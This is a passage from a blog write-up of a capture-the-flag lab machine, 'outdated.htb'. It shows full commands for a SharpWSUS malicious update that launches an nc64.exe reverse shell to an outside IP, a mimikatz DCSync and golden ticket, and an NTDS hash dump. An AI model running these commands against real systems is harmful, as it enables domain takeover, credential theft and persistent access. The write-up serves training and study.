<li>Clone the repo.
<ul>
<li><code>git clone https://github.com/nettitude/SharpWSUS.git</code></li>
</ul>
</li>
<li>Open up Visual <code>Studio 2022</code>
<ul>
<li><figure><img src="/ox-hugo/2024-10-12-075608_.png">
</figure>
</li>
</ul>
</li>
<li>Build &amp; voila a nice new <code>sharpWSUS.exe</code> binary.</li>
</ul>
</li>
</ul>
<h4 id="using-sharpwsus-to-trigger-a-reverse-shell-as-system">Using <code>SharpWSUS</code> to trigger a reverse shell as system:</h4>
<ul>
<li><strong>Looking at the creators blog-post about the tool I see the following paragraph</strong>:</li>
</ul>
<blockquote>
<p>While the need for a signed binary can limit some attack paths, there are still plenty of binaries that could be used such as PsExec.exe to run a command as SYSTEM, RunDLL32.exe to run a malicious DLL on a network share, MsBuild.exe to grab and execute a remote payload and more. The example in this blog will use PsExec.exe for code execution (<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">https://docs.microsoft.com/en-us/sysinternals/downloads/psexec</a>).</p>
<p>A patch leveraging PsExec.exe can be done with the following command:</p>
<p>SharpWSUS.exe create /payload:&ldquo;C:\Users\ben\Documents\pk\psexec.exe&rdquo; /args:&quot;-accepteula -s -d cmd.exe /c \&ldquo;net user WSUSDemo Password123! /add &amp;&amp; net localgroup administrators WSUSDemo /add\&rdquo;&quot; /title:&ldquo;WSUSDemo&rdquo;</p>
</blockquote>
<ul>
<li><a href="https://labs.nettitude.com/blog/introducing-sharpwsus/">https://labs.nettitude.com/blog/introducing-sharpwsus/</a></li>
<li>If you remember correctly <code>sflowers</code> had a <code>PsExec64.exe</code> binary on her desktop so this gives us a valid attack path.</li>
</ul>
<h5 id="creating-a-malicious-update-with-sharpwsus">Creating a Malicious Update with <code>SharpWSUS</code>:</h5>
<ul>
<li><strong>I create my</strong> <code>SharpWSUS</code> <strong>payload to trigger an</strong> <code>nc64.exe</code> <strong>binary I have uploaded</strong>
<ul>
<li><code>.\SharpWSUS.exe create /payload:&quot;C:\Users\sflowers\Desktop\PsExec64.exe&quot; /args:&quot;-accepteula -s -d C:\Users\sflowers\Documents\nc64.exe -e cmd.exe 10.10.14.43 443&quot; /title:&quot;EmergencyUpdate&quot;</code></li>
<li><figure><img src="/ox-hugo/2024-10-12-082517_.png">
</figure>
</li>
<li>+Note+: You can see at the bottom of the output it tells us the next command we need to run in order to push this malicious update.</li>
</ul>
</li>
</ul>
<h5 id="approving-our-malicious-update-with-sharpwsus">Approving our Malicious Update with <code>SharpWSUS</code>:</h5>
<ul>
<li>
<p><strong>Approve the update</strong>:</p>
<ul>
<li><code>.\SharpWSUS.exe approve /updateid:bdf7d92c-2b96-42c3-b615-fc207c9d49af /computername:dc.outdated.htb /groupname:&quot;EmergencyUpdate&quot;</code></li>
<li><figure><img src="/ox-hugo/2024-10-12-082756_.png">
</figure>
</li>
<li>+Note+:
<ul>
<li>Be patient it can take a minute or longer in real life depending on update schedules etc.
<ul>
<li>In real life this could take upto a week etc if updates are only pushed weekly and under certain circumstances.</li>
</ul>
</li>
<li><code>/groupname:</code> = the <code>/title:</code> we set in the previous step e.g. <code>&quot;EmergencyUpdate&quot;</code></li>
<li>Remember to modify the <code>/computername:</code> to be the FQDN of the target you are attacking.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Shell Caught</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-10-12-082736_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h2 id="4-dot-persistence">4. Persistence:</h2>
<h3 id="creating-a-golden-ticket-with-mimikatz-dot-exe">Creating a golden ticket with <code>mimikatz.exe</code>:</h3>
<ul>
<li>
<p><strong>I upload mimikatz via the existin evil-winrm session with</strong> <code>sflowers</code>:</p>
<ul>
<li>I perform a dcsync attack and dump the krbtgt hash:</li>
<li><code>lsadump::dcsync /user:krbtgt /domain:outdated.htb</code></li>
<li><figure><img src="/ox-hugo/2024-10-12-084028_.png">
</figure>
</li>
<li>I get the <code>SID</code>, <code>KRBTGT NTLM</code> hash which is all I need to perform my Golden Ticket Attack.</li>
</ul>
</li>
<li>
<p><strong>I create my golden ticket</strong>:</p>
<ul>
<li><code>kerberos::golden /domain:outdated.htb /user:Administrator /sid:S-1-5-21-4089647348-67660539-4016542185 /rc4:&lt;redacted&gt;</code></li>
<li><figure><img src="/ox-hugo/2024-10-12-084203_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>I transfer the ticket via</strong> <code>evil-winrm</code>:</p>
</li>
<li>
<p><strong>Convert with</strong> <code>impacket-ticketconverter</code>:</p>
<ul>
<li><code>impacket-ticketConverter ticket.kirbi admin.ccache</code></li>
<li><figure><img src="/ox-hugo/2024-10-12-084327_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>Import into session my current session</strong>:</p>
<ul>
<li><code>export KRB5CCNAME=./admin.ccache</code></li>
<li><figure><img src="/ox-hugo/2024-10-12-084407_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>Syncronise my time with the Domain Controller</strong>:</p>
<ul>
<li><code>sudo ntpdate -s dc.$domain</code></li>
<li><figure><img src="/ox-hugo/2024-10-12-084444_.png">
</figure>
</li>
<li>+Note+: As kerberos uses time based security checks this is important</li>
</ul>
</li>
<li>
<p><strong>Check the ticket is in memory</strong>:</p>
<ul>
<li><code>klist</code></li>
<li><figure><img src="/ox-hugo/2024-10-12-084641_.png">
</figure>
</li>
<li>If you look we can see this ticket is valid for 10 years so as long no-one changes the <code>krbtgt</code> password (which is unlikely) we will have persistence.</li>
</ul>
</li>
<li>
<p><strong>Connect Using my ticket using</strong> <code>impacket-psexec</code>:</p>
<ul>
<li><code>impacket-psexec dc.$domain -k</code></li>
<li><figure><img src="/ox-hugo/2024-10-12-084756_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h3 id="dumping-ntds-for-fun-for-fun-and-profit">Dumping NTDS for fun for fun and profit:</h3>
<ul>
<li>
<p>Now that we have persistence we might as well pillage:</p>
</li>
<li>
<p><strong>I perform a DCSync attack using netexec and dump all hashes</strong>:</p>
<ul>
<li><code>netexec smb $box -u administrator --use-kcache -M ntdsutil</code></li>
<li><figure><img src="/ox-hugo/2024-10-12-085001_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h2 id="lessons-learned">Lessons Learned:</h2>
<h3 id="what-did-i-learn">What did I learn?</h3>
<ol>
<li>I learned about the follina exploit, I had never used that exploit previously so was interesting using purely the malicious HTML part as a delivery mechanism for our exploit.</li>
<li>I learned a lot about WSUS. Looking at the different architecture options available and how to query the registry was interesting from an enumeration point of view.</li>
<li>I learned about the process of doing a shadow credentials attack. I even stopped the box halfway to do a deep-dive and made a blog post I found it so interesting:
<ul>
<li><a href="https://bloodstiller.com/articles/shadowcredentialsattack/">https://bloodstiller.com/articles/shadowcredentialsattack/</a></li>
</ul>
</li>
</ol>
<h3 id="what-silly-mistakes-did-i-make">What silly mistakes did I make?</h3>
<ol>
<li>Trying to download to <code>C:\\Temp\\</code> you know the FAMOUS non-existent directory in windows!</li>
<li>I had a couple of real dense moments when I was tired &amp; over-thinking about how I could use the malicious Follina <code>html</code> instead of just sending the link.</li>
<li>Oh, for some reason I kept forgetting to add the title with SharpWSUS.</li>
</ol>
<h2 id="sign-off">Sign off:</h2>
<p>Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!</p>
<p>Until next time, hack the planet!</p>
<p>– Bloodstiller</p>
<p>– Get in touch bloodstiller at proton dot me</p>

            
        </div>
    </article>

        </main>

        <footer class="footer">
    <div class="footer-left">
        <ul class="social">
            
                <li>All Rights Reserved ®.</li>
            

            
                <li>Bloodstiller</li>
            

            
                
            
                
            
                
                    <li>
                        
                            <a href="https://github.com/bloodstiller" target="_blank">
                                <i class="bi-github"></i>
                            </a>
                        

                    </li>
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
        </ul>
    </div>

    <div class="footer-right">
        <ul class="control status clearfix">
            
                <li>
                    
                        Word Count:
                        5255
                    
                </li>
            


            
                <li>en</li>
            

            

            

            
                <li>
                    
                        Last modified: &nbsp;
                        <time>
                            Oct 13 2024 00:00:00
                        </time>
                    
                </li>
            

            
        </ul>
    </div>
</footer>

    </body>

    






















    
        
        <script
            type="text/javascript"
            src="/_theme/js/codeblock_copy.c59588ba3a219dafab515508b0bcd2d0592dc9e0e08de20dc1983bfd8cb69d03d37c78eadd81ee7bef724570f9e4286d9ea1c53ca59d3711c0bcad9e9134d0e9.js"
            integrity="sha512-xZWIujohna&#43;rUVUIsLzS0FktyeDgjeINwZg7/Yy2nQPTfHjq3YHue&#43;9yRXD55ChtnqHFPKWdNxHAvK2ekTTQ6Q=="></script>
    
        
        <script
            type="text/javascript"
            src="/_theme/js/custom.e55ae031ca7d8c1e9bde9a72058dd382e3de5ff9b7df41d6d0e4ccb82ff9962e74b4865412dc15db16e5f16012d5cf9e2330b9826a3a36d5a272077f70e1341b.js"
            integrity="sha512-5VrgMcp9jB6b3ppyBY3TguPeX/m330HW0OTMuC/5li50tIZUEtwV2xbl8WAS1c&#43;eIzC5gmo6NtWicgd/cOE0Gw=="></script>
    
        
        <script
            type="text/javascript"
            src="/_theme/js/dir_toggle.e6f8c63f3ed9aefa9cedb3be3d5ab67e00bc3cf87a8dd7ef1ed55d642e9a7d80837636a26ae77f967f2aa74a44ae70c4134e25abca587f048c60807ba9e9c82f.js"
            integrity="sha512-5vjGPz7Zrvqc7bO&#43;PVq2fgC8PPh6jdfvHtVdZC6afYCDdjaiaud/ln8qp0pErnDEE04lq8pYfwSMYIB7qenILw=="></script>
    
        
        <script
            type="text/javascript"
            src="/_theme/js/sidebar.01b59c615736643387108a100de70c51d5e98477bdc338244a87d37f7e38286b48683459eade68087f0688f0235e7a48691e633954fa930d41823e9ddf797085.js"
            integrity="sha512-AbWcYVc2ZDOHEIoQDecMUdXphHe9wzgkSofTf344KGtIaDRZ6t5oCH8GiPAjXnpIaR5jOVT6kw1Bgj6d33lwhQ=="></script>
    















<link
    rel="stylesheet"
    href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" />




</html>
